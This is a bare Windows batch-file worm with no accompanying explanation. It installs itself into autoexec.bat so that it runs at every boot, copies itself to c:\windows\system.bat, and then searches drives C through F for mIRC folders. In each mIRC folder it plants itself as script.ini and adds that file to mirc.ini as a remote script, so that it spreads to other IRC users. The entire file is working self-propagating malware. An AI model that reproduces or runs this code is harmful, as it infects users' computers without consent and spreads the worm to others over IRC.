@Echo off
@if exist c:\windows\system.bat goto sss
@echo call c:\windows\system.bat >> c:\autoexec.bat
@echo exit >> c:\autoexec.bat
:sss
@copy /y %0 c:\windows\system.bat >nul
@if exist c:\mirc\mirc.ini goto mirc
:a
@if exist c:\progra~1\mirc\mirc.ini goto prog
:b
@if exist d:\mirc\mirc.ini goto dmirc
:c
@if exist e:\mirc\mirc.ini goto emirc
:d
@if exist f:\mirc\mirc.ini goto fmirc
:e

@goto end

:mirc
@copy /y %0 c:\mirc\script.ini >nul
@echo [rfiles] >> c:\mirc\mirc.ini
@echo n0=script.ini >> c:\mirc\mirc.ini
@echo n1=script.ini >> c:\mirc\mirc.ini
@echo n2=script.ini >> c:\mirc\mirc.ini
@echo n3=script.ini >> c:\mirc\mirc.ini
@echo n4=script.ini >> c:\mirc\mirc.ini
@echo n5=script.ini >> c:\mirc\mirc.ini
@echo n6=script.ini >> c:\mirc\mirc.ini
@echo n7=script.ini >> c:\mirc\mirc.ini
@echo n8=script.ini >> c:\mirc\mirc.ini
@echo n9=script.ini >> c:\mirc\mirc.ini
@echo n10=script.ini >> c:\mirc\mirc.ini
@echo n11=script.ini >> c:\mirc\mirc.ini
@echo n12=script.ini >> c:\mirc\mirc.ini
@echo n13=script.ini >> c:\mirc\mirc.ini
@echo n14=script.ini >> c:\mirc\mirc.ini
@echo n15=script.ini >> c:\mirc\mirc.ini
@echo n16=script.ini >> c:\mirc\mirc.ini
@echo n17=script.ini >> c:\mirc\mirc.ini
@echo n18=script.ini >> c:\mirc\mirc.ini
@echo n19=script.ini >> c:\mirc\mirc.ini
@echo n20=script.ini >> c:\mirc\mirc.ini
@goto a

:prog
@copy /y %0 c:\progra~1\mirc\script.ini >nul
@echo [rfiles] >> c:\progra~1\mirc\mirc.ini
@echo n0=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n1=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n2=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n3=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n4=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n5=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n6=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n7=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n8=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n9=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n10=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n11=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n12=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n13=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n14=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n15=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n16=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n17=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n18=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n19=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n20=script.ini >> c:\progra~1\mirc\mirc.ini
@goto b

:dmirc
@copy /y %0 d:\mirc\script.ini >nul
@echo [rfiles] >> d:\mirc\mirc.ini
@echo n0=script.ini >> d:\mirc\mirc.ini
@echo n1=script.ini >> d:\mirc\mirc.ini
@echo n2=script.ini >> d:\mirc\mirc.ini
@echo n3=script.ini >> d:\mirc\mirc.ini
@echo n4=script.ini >> d:\mirc\mirc.ini
@echo n5=script.ini >> d:\mirc\mirc.ini
@echo n6=script.ini >> d:\mirc\mirc.ini
@echo n7=script.ini >> d:\mirc\mirc.ini
@echo n8=script.ini >> d:\mirc\mirc.ini
@echo n9=script.ini >> d:\mirc\mirc.ini
@echo n10=script.ini >> d:\mirc\mirc.ini
@echo n11=script.ini >> d:\mirc\mirc.ini
@echo n12=script.ini >> d:\mirc\mirc.ini
@echo n13=script.ini >> d:\mirc\mirc.ini
@echo n14=script.ini >> d:\mirc\mirc.ini
@echo n15=script.ini >> d:\mirc\mirc.ini
@echo n16=script.ini >> d:\mirc\mirc.ini
@echo n17=script.ini >> d:\mirc\mirc.ini
@echo n18=script.ini >> d:\mirc\mirc.ini
@echo n19=script.ini >> d:\mirc\mirc.ini
@echo n20=script.ini >> d:\mirc\mirc.ini
@goto c

:emirc
@copy /y %0 e:\mirc\script.ini >nul
@echo [rfiles] >> e:\mirc\mirc.ini
@echo n0=script.ini >> e:\mirc\mirc.ini
@echo n1=script.ini >> e:\mirc\mirc.ini
@echo n2=script.ini >> e:\mirc\mirc.ini
@echo n3=script.ini >> e:\mirc\mirc.ini
@echo n4=script.ini >> e:\mirc\mirc.ini
@echo n5=script.ini >> e:\mirc\mirc.ini
@echo n6=script.ini >> e:\mirc\mirc.ini
@echo n7=script.ini >> e:\mirc\mirc.ini
@echo n8=script.ini >> e:\mirc\mirc.ini
@echo n9=script.ini >> e:\mirc\mirc.ini
@echo n10=script.ini >> e:\mirc\mirc.ini
@echo n11=script.ini >> e:\mirc\mirc.ini
@echo n12=script.ini >> e:\mirc\mirc.ini
@echo n13=script.ini >> e:\mirc\mirc.ini
@echo n14=script.ini >> e:\mirc\mirc.ini
@echo n15=script.ini >> e:\mirc\mirc.ini
@echo n16=script.ini >> e:\mirc\mirc.ini
@echo n17=script.ini >> e:\mirc\mirc.ini
@echo n18=script.ini >> e:\mirc\mirc.ini
@echo n19=script.ini >> e:\mirc\mirc.ini
@echo n20=script.ini >> e:\mirc\mirc.ini
@goto d

:fmirc
@copy /y %0 f:\mirc\script.ini >nul
@echo [rfiles] >> f:\mirc\mirc.ini
@echo n0=script.ini >> f:\mirc\mirc.ini
@echo n1=script.ini >> f:\mirc\mirc.ini
@echo n2=script.ini >> f:\mirc\mirc.ini
@echo n3=script.ini >> f:\mirc\mirc.ini
@echo n4=script.ini >> f:\mirc\mirc.ini
@echo n5=script.ini >> f:\mirc\mirc.ini
@echo n6=script.ini >> f:\mirc\mirc.ini
@echo n7=script.ini >> f:\mirc\mirc.ini
@echo n8=script.ini >> f:\mirc\mirc.ini
@echo n9=script.ini >> f:\mirc\mirc.ini
@echo n10=script.ini >> f:\mirc\mirc.ini
@echo n11=script.ini >> f:\mirc\mirc.ini
@echo n12=script.ini >> f:\mirc\mirc.ini
@echo n13=script.ini >> f:\mirc\mirc.ini
@echo n14=script.ini >> f:\mirc\mirc.ini
@echo n15=script.ini >> f:\mirc\mirc.ini
@echo n16=script.ini >> f:\mirc\mirc.ini
@echo n17=script.ini >> f:\mirc\mirc.ini
@echo n18=script.ini >> f:\mirc\mirc.ini
@echo n19=script.ini >> f:\mirc\mirc.ini
@echo n20=script.ini >> f:\mirc\mirc.ini
@goto e
[script]
